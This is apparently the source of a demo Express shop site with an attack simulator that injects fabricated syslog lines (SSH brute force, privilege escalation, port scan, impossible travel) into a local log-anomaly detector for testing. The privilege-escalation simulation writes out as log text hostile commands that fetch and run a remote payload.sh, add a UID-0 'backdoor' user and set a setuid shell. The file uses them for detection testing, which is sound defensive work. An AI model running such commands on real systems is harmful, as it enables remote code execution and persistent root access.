'use strict';

const express = require('express');
const fs = require('fs');
const http = require('http');
const path = require('path');

const app = express();
const PORT = 4000;
const LOG_SENTINEL_URL = 'http://localhost:8000/api/ingest';
const LOG_FILE = path.join(__dirname, 'access.log');

// Ensure log file exists
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// ── Log format helpers ────────────────────────────────────────────────────────

// Apache Combined Log (for real browsing traffic written to access.log)
function apacheTimestamp() {
  const now = new Date();
  const pad = (n) => String(n).padStart(2, '0');
  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  return `${pad(now.getUTCDate())}/${months[now.getUTCMonth()]}/${now.getUTCFullYear()}:${pad(now.getUTCHours())}:${pad(now.getUTCMinutes())}:${pad(now.getUTCSeconds())} +0000`;
}

function makeApacheLine(ip, user, method, urlPath, status, bytes) {
  return `${ip} - ${user || '-'} [${apacheTimestamp()}] "${method} ${urlPath} HTTP/1.1" ${status} ${bytes}\n`;
}

// Syslog format (for attack simulations — matches the classifier's expected actions)
function syslogTimestamp(offsetSeconds = 0) {
  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  const d = new Date(Date.now() + offsetSeconds * 1000);
  const pad = (n) => String(n).padStart(2, '0');
  const day = String(d.getUTCDate()).padStart(2, ' ');
  return `${months[d.getUTCMonth()]} ${day} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
}

const HOST = 'web-prod-01';

function syslogFailed(ip, user, port, offsetSec = 0) {
  return `${syslogTimestamp(offsetSec)} ${HOST} sshd[${10000 + Math.floor(Math.random()*50000)}]: Failed password for ${user} from ${ip} port ${port} ssh2\n`;
}
function syslogAccepted(ip, user, port, offsetSec = 0) {
  return `${syslogTimestamp(offsetSec)} ${HOST} sshd[${10000 + Math.floor(Math.random()*50000)}]: Accepted password for ${user} from ${ip} port ${port} ssh2\n`;
}
function syslogSudo(user, command, offsetSec = 0) {
  return `${syslogTimestamp(offsetSec)} ${HOST} sudo[${10000 + Math.floor(Math.random()*50000)}]:  ${user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=${command}\n`;
}
function syslogSession(action, user, offsetSec = 0) {
  return `${syslogTimestamp(offsetSec)} ${HOST} systemd-logind[${1000 + Math.floor(Math.random()*9000)}]: session ${action} for user ${user}\n`;
}

// Build ~60 normal syslog baseline lines so IsolationForest has context
function buildSyslogBaseline() {
  const users = ['deploy', 'alice', 'bob', 'charlie', 'www-data'];
  const normalIps = ['192.168.1.100', '192.168.1.101', '10.0.0.2'];
  let lines = '';
  for (let i = 0; i < 60; i++) {
    const u = users[i % users.length];
    const ip = normalIps[i % normalIps.length];
    lines += syslogSession('opened', u, -3600 + i * 30);
    if (i % 10 === 0) lines += syslogAccepted(ip, u, 22, -3600 + i * 30);
  }
  return lines;
}

// Post a standalone batch of log lines to Log Sentinel (no file accumulation)
function sendToSentinel(lines) {
  const body = JSON.stringify({ lines });
  const url = new URL(LOG_SENTINEL_URL);
  const options = {
    hostname: url.hostname,
    port: parseInt(url.port) || 80,
    path: url.pathname,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  };
  const req = http.request(options, (res) => {
    let d = '';
    res.on('data', c => d += c);
    res.on('end', () => {
      try {
        const r = JSON.parse(d);
        console.log(`[sentinel] new anomalies: ${r.new}, total: ${r.anomalies?.length}`);
      } catch {}
    });
  });
  req.on('error', (e) => console.error('[sentinel] ingest failed:', e.message));
  req.write(body);
  req.end();
}

// For real browsing: append to access.log (informational only, not sent to sentinel)
function writeAndSend(line) {
  fs.appendFile(LOG_FILE, line, () => {});
}

// ── Logging middleware (only for normal site routes) ──────────────────────────
function logRequest(req, res, next) {
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1')
    .split(',')[0].trim();
  res.on('finish', () => {
    const line = makeApacheLine(ip, req.user || '-', req.method, req.path, res.statusCode, 512);
    writeAndSend(line);
  });
  next();
}

// ── HTML helpers ──────────────────────────────────────────────────────────────
const layout = (title, body) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title} — ShopEase</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: system-ui, sans-serif; background: #f1f5f9; color: #1e293b; }
    nav {
      background: #1e40af; color: #fff; padding: 14px 32px;
      display: flex; align-items: center; justify-content: space-between;
    }
    nav a { color: #bfdbfe; text-decoration: none; margin-left: 20px; font-size: 14px; }
    nav a:hover { color: #fff; }
    .brand { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; }
    .container { max-width: 960px; margin: 40px auto; padding: 0 20px; }
    .card {
      background: #fff; border-radius: 12px; padding: 32px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.06); margin-bottom: 24px;
    }
    h1 { font-size: 22px; font-weight: 700; margin-bottom: 16px; }
    h2 { font-size: 16px; font-weight: 600; margin-bottom: 12px; color: #475569; }
    input {
      width: 100%; padding: 10px 14px; border: 1.5px solid #e2e8f0;
      border-radius: 8px; font-size: 14px; margin-bottom: 12px;
    }
    input:focus { outline: none; border-color: #3b82f6; }
    button, .btn {
      display: inline-block; padding: 10px 22px; background: #2563eb; color: #fff;
      border: none; border-radius: 8px; font-size: 14px; font-weight: 600;
      cursor: pointer; text-decoration: none;
    }
    button:hover, .btn:hover { background: #1d4ed8; }
    .btn-red { background: #dc2626; }
    .btn-red:hover { background: #b91c1c; }
    .btn-orange { background: #ea580c; }
    .btn-orange:hover { background: #c2410c; }
    .btn-yellow { background: #d97706; }
    .btn-yellow:hover { background: #b45309; }
    .alert-box {
      padding: 12px 16px; border-radius: 8px; font-size: 14px; margin-bottom: 16px;
    }
    .alert-error { background: #fef2f2; color: #991b1b; border: 1px solid #fecaca; }
    .alert-success { background: #f0fdf4; color: #166534; border: 1px solid #bbf7d0; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
    .product { background: #fff; border-radius: 10px; padding: 20px; text-align: center;
               box-shadow: 0 1px 6px rgba(0,0,0,0.05); }
    .product-img { font-size: 48px; margin-bottom: 12px; }
    .product-name { font-weight: 600; font-size: 14px; margin-bottom: 4px; }
    .product-price { color: #2563eb; font-weight: 700; }
    .simulate-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px; }
    .sim-card {
      background: #fff; border-radius: 10px; padding: 20px;
      box-shadow: 0 1px 6px rgba(0,0,0,0.05);
    }
    .sim-card h3 { font-size: 14px; font-weight: 700; margin-bottom: 6px; }
    .sim-card p { font-size: 12px; color: #64748b; margin-bottom: 14px; }
    #status { margin-top: 16px; font-size: 13px; color: #475569; min-height: 20px; }
    .pill {
      display: inline-block; padding: 2px 10px; border-radius: 999px;
      font-size: 11px; font-weight: 600; margin-left: 8px;
    }
    .pill-red { background: #fef2f2; color: #dc2626; }
    .pill-orange { background: #fff7ed; color: #ea580c; }
  </style>
</head>
<body>
  <nav>
    <span class="brand">🛒 ShopEase</span>
    <div>
      <a href="/">Home</a>
      <a href="/products">Products</a>
      <a href="/dashboard">Dashboard</a>
      <a href="/admin">Admin</a>
      <a href="/login">Login</a>
      <a href="/simulate" style="color:#fbbf24;font-weight:700">⚡ Simulate</a>
    </div>
  </nav>
  <div class="container">${body}</div>
</body>
</html>`;

// ── Routes ────────────────────────────────────────────────────────────────────

app.get('/', logRequest, (req, res) => {
  res.send(layout('Home', `
    <div class="card">
      <h1>Welcome to ShopEase</h1>
      <p style="color:#64748b;margin-bottom:20px">Your one-stop shop for everything.</p>
      <a class="btn" href="/products">Browse Products</a>
      <a class="btn" href="/login" style="margin-left:12px;background:#6b7280">Login</a>
    </div>
    <div class="grid">
      <div class="product"><div class="product-img">💻</div>
        <div class="product-name">Laptop Pro</div><div class="product-price">$999</div></div>
      <div class="product"><div class="product-img">📱</div>
        <div class="product-name">Phone X</div><div class="product-price">$699</div></div>
      <div class="product"><div class="product-img">🎧</div>
        <div class="product-name">Headphones</div><div class="product-price">$199</div></div>
      <div class="product"><div class="product-img">⌚</div>
        <div class="product-name">Smartwatch</div><div class="product-price">$349</div></div>
    </div>
  `));
});

app.get('/products', logRequest, (req, res) => {
  res.send(layout('Products', `
    <div class="card"><h1>All Products</h1></div>
    <div class="grid">
      ${['💻 Laptop $999','📱 Phone $699','🎧 Headphones $199','⌚ Watch $349',
         '🖥️ Monitor $449','⌨️ Keyboard $89','🖱️ Mouse $49','📷 Camera $599']
        .map(p => {
          const [icon, ...rest] = p.split(' ');
          return `<div class="product"><div class="product-img">${icon}</div>
            <div class="product-name">${rest.slice(0,-1).join(' ')}</div>
            <div class="product-price">${rest.at(-1)}</div></div>`;
        }).join('')}
    </div>
  `));
});

app.get('/login', logRequest, (req, res) => {
  const err = req.query.error;
  res.send(layout('Login', `
    <div class="card" style="max-width:400px;margin:0 auto">
      <h1>Sign In</h1>
      ${err ? `<div class="alert-box alert-error">Invalid username or password.</div>` : ''}
      <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" style="width:100%">Login</button>
      </form>
    </div>
  `));
});

app.post('/login', logRequest, (req, res) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === 'secret123') {
    res.send(layout('Login', `
      <div class="card" style="max-width:400px;margin:0 auto">
        <div class="alert-box alert-success">✅ Logged in as admin</div>
        <a class="btn" href="/dashboard">Go to Dashboard</a>
      </div>
    `));
  } else {
    res.redirect('/login?error=1');
  }
});

app.get('/dashboard', logRequest, (req, res) => {
  res.send(layout('Dashboard', `
    <div class="card"><h1>User Dashboard</h1>
      <p style="color:#64748b">Welcome back! Here are your recent orders.</p>
    </div>
    <div class="card"><h2>Recent Orders</h2>
      <p style="font-size:14px;color:#64748b">No orders yet.</p>
    </div>
  `));
});

app.get('/admin', logRequest, (req, res) => {
  res.status(403).send(layout('Admin', `
    <div class="card">
      <h1>403 — Forbidden <span class="pill pill-red">RESTRICTED</span></h1>
      <p style="color:#64748b">Administrator access only.</p>
    </div>
  `));
});

app.get('/api/data', logRequest, (req, res) => {
  res.json({ products: 42, users: 1337, revenue: '$128,400' });
});

// ── Simulate page ─────────────────────────────────────────────────────────────
app.get('/simulate', (req, res) => {
  res.send(layout('Attack Simulator', `
    <div class="card">
      <h1>⚡ Attack Simulator <span class="pill pill-orange">DEMO ONLY</span></h1>
      <p style="color:#64748b;margin-bottom:8px">
        Each button injects malicious log lines directly into Log Sentinel.
        Watch the dashboard — threats should appear within seconds.
      </p>
    </div>
    <div class="simulate-grid">
      <div class="sim-card">
        <h3>🔨 Brute Force SSH</h3>
        <p>35 failed login attempts from a Tor exit node IP in 90 seconds.</p>
        <button class="btn-red btn" onclick="simulate('brute-force')">Run Attack</button>
      </div>
      <div class="sim-card">
        <h3>🔐 Privilege Escalation</h3>
        <p>www-data runs sudo wget + useradd + chmod 4755 backdoor.</p>
        <button class="btn-orange btn" onclick="simulate('privesc')">Run Attack</button>
      </div>
      <div class="sim-card">
        <h3>🔍 Port Scan</h3>
        <p>20 different paths hit in rapid succession from a single IP.</p>
        <button class="btn-yellow btn" onclick="simulate('portscan')">Run Attack</button>
      </div>
      <div class="sim-card">
        <h3>🌍 Impossible Travel</h3>
        <p>Admin logs in from US, then Moscow 2 minutes later.</p>
        <button class="btn" style="background:#7c3aed" onclick="simulate('travel')">Run Attack</button>
      </div>
    </div>
    <div id="status"></div>
    <script>
      async function simulate(type) {
        const el = document.getElementById('status');
        el.textContent = '⏳ Sending attack logs...';
        try {
          const r = await fetch('/simulate/' + type, { method: 'POST' });
          const d = await r.json();
          el.textContent = '✅ ' + d.message;
        } catch(e) {
          el.textContent = '❌ Error: ' + e.message;
        }
      }
    </script>
  `));
});

// ── Attack simulation endpoints (syslog format — matches classifier rules) ────

app.post('/simulate/brute-force', (req, res) => {
  const ip = '185.220.101.34'; // known Tor exit node
  let lines = buildSyslogBaseline();
  // 35 rapid failed logins from same IP
  for (let i = 0; i < 35; i++) {
    lines += syslogFailed(ip, 'root', 22, i * 2);
  }
  // One successful login right after — account compromise
  lines += syslogAccepted(ip, 'root', 22, 72);
  sendToSentinel(lines);
  res.json({ message: '35 failed SSH logins injected from 185.220.101.34 — check Log Sentinel!' });
});

app.post('/simulate/privesc', (req, res) => {
  let lines = buildSyslogBaseline();
  // www-data suddenly running sudo commands
  lines += syslogAccepted('10.0.0.5', 'www-data', 4444, 0);
  lines += syslogSudo('www-data', '/usr/bin/wget http://185.220.101.1/payload.sh', 2);
  lines += syslogSudo('www-data', '/bin/bash /tmp/payload.sh', 4);
  lines += syslogSudo('www-data', '/usr/sbin/useradd -o -u 0 backdoor', 6);
  lines += syslogSudo('www-data', '/bin/chmod 4755 /tmp/shell', 8);
  lines += syslogSudo('www-data', '/usr/bin/crontab -e', 10);
  sendToSentinel(lines);
  res.json({ message: 'Privilege escalation sequence injected (www-data → root) — check Log Sentinel!' });
});

app.post('/simulate/portscan', (req, res) => {
  const ip = '45.33.32.156'; // shodan.io scanner IP
  let lines = buildSyslogBaseline();
  // 20 failed logins hitting different ports (unique ports = port scan signal)
  const ports = [21,23,25,80,443,8080,8443,3306,5432,6379,27017,9200,11211,2181,5000,6000,7000,8000,9000,10000];
  for (const port of ports) {
    lines += syslogFailed(ip, 'root', port, ports.indexOf(port));
  }
  sendToSentinel(lines);
  res.json({ message: '20-port scan injected from 45.33.32.156 — check Log Sentinel!' });
});

app.post('/simulate/travel', (req, res) => {
  let lines = buildSyslogBaseline();
  // Admin logs in from US IP
  lines += syslogAccepted('72.21.198.66', 'admin', 443, 0);
  lines += syslogSession('opened', 'admin', 1);
  // 2 min later same user logs in from Moscow IP
  lines += syslogAccepted('95.173.136.70', 'admin', 443, 120);
  lines += syslogSession('opened', 'admin', 121);
  sendToSentinel(lines);
  res.json({ message: 'Impossible travel injected (US → Moscow in 2 min) — check Log Sentinel!' });
});

// ── Start ─────────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n🛒  ShopEase target site running at http://localhost:${PORT}`);
  console.log(`⚡  Attack simulator:              http://localhost:${PORT}/simulate`);
  console.log(`📡  Sending logs to:               ${LOG_SENTINEL_URL}\n`);
});
